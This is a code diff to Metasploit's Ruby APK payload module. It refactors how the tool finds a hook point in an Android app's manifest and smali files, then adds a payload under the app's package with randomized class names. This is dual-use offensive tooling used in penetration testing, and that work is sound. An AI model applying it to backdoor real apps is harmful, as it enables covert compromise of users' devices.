@@ -34,40 +34,64 @@ class Msf::Payload::Apk
     end
   end
 
-  # Find a suitable smali point to hook
-  def find_hook_point(amanifest)
-    package = amanifest.xpath("//manifest").first['package']
-    application = amanifest.xpath('//application')
-    application_name = application.attribute("name")
-    if application_name
-      application_str = application_name.to_s
-      unless application_str == 'android.app.Application'
-        return application_str
+  # Find a suitable smali point to hook.
+  # Returns the first suitable hook point.
+  #
+  # @param manifest [String] AndroidManifest.xml file contents
+  #
+  # @return [String] Full class name, for example: com.example.app.MainActivity
+  def find_hook_point(manifest)
+    return unless manifest
+
+    package = manifest.xpath('//manifest').first['package']
+
+    application = manifest.xpath('//application')
+    application_name = application.attribute('name').to_s
+    unless (application_name.blank? || application_name == 'android.app.Application')
+      unless application_name.include?('.')
+        application_name = '.' + application_name
       end
+      if application_name.start_with?('.')
+        application_name = package + application_name
+      end
+      return application_name
     end
-    activities = amanifest.xpath("//activity|//activity-alias")
+
+    activities = manifest.xpath('//activity|//activity-alias')
     for activity in activities
-      activityname = activity.attribute("targetActivity")
-      unless activityname
-        activityname = activity.attribute("name")
+      activity_name = activity.attribute('targetActivity').to_s
+      if activity_name.blank?
+        activity_name = activity.attribute('name').to_s
       end
+
+      next if activity_name.blank?
+
       category = activity.search('category')
-      unless category
-        next
-      end
+      next unless category
+
       for cat in category
-        categoryname = cat.attribute('name')
-        if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
-          name = activityname.to_s
-          if name.start_with?('.')
-            name = package + name
-          end
-          return name
+        category_name = cat.attribute('name').to_s
+        next unless (category_name == 'android.intent.category.LAUNCHER' || category_name == 'android.intent.action.MAIN')
+
+        unless activity_name.include?('.')
+          activity_name = '.' + activity_name
         end
+        if activity_name.start_with?('.')
+          activity_name = package + activity_name
+        end
+
+        return activity_name
       end
     end
+
+    nil
   end
 
+  # Read AndroidManifest.xml file.
+  #
+  # @param manifest_file [String] Path to AndroidManifest.xml file
+  #
+  # @return [Nokogiri::XML] AndroidManifest.xml file contents
   def parse_manifest(manifest_file)
     File.open(manifest_file, "rb"){|file|
       data = File.read(file)
@@ -282,22 +306,21 @@ class Msf::Payload::Apk
 
     print_status "Locating hook point..\n"
     hookable_class = find_hook_point(amanifest)
-    smalifile = "#{tempdir}/original/smali*/" + hookable_class.gsub(/\./, "/") + ".smali"
-    smalifiles = Dir.glob(smalifile)
-    for smalifile in smalifiles
-      if File.readable?(smalifile)
-        hooksmali = File.read(smalifile)
-        break
-      end
+    if hookable_class.blank?
+      raise 'Unable to find hookable class in AndroidManifest.xml'
     end
 
-    unless hooksmali
-      raise RuntimeError, "Unable to find hook point in #{smalifile}\n"
+    hookable_class_filename = hookable_class.to_s.gsub('.', '/') + '.smali'
+    hookable_class_filepath = "#{tempdir}/original/smali*/#{hookable_class_filename}"
+    smalifile = Dir.glob(hookable_class_filepath).select { |f| File.readable?(f) && !File.symlink?(f) }.flatten.first
+    if smalifile.blank?
+      raise "Unable to find class file: #{hookable_class_filepath}"
     end
 
+    hooksmali = File.read(smalifile)
     entrypoint = 'return-void'
-    unless hooksmali.include? entrypoint
-      raise RuntimeError, "Unable to find hookable function in #{smalifile}\n"
+    unless hooksmali.include?(entrypoint)
+      raise "Unable to find hookable function in #{smalifile}"
     end
 
     # Remove unused files
@@ -311,6 +334,7 @@ class Msf::Payload::Apk
     classes['MainService'] = Rex::Text::rand_text_alpha_lower(5).capitalize
     classes['MainBroadcastReceiver'] = Rex::Text::rand_text_alpha_lower(5).capitalize
     package_slash = package.gsub(/\./, "/")
+
     print_status "Adding payload as package #{package}\n"
     payload_files = Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/*.smali")
     payload_dir = "#{tempdir}/original/smali/#{package_slash}/"
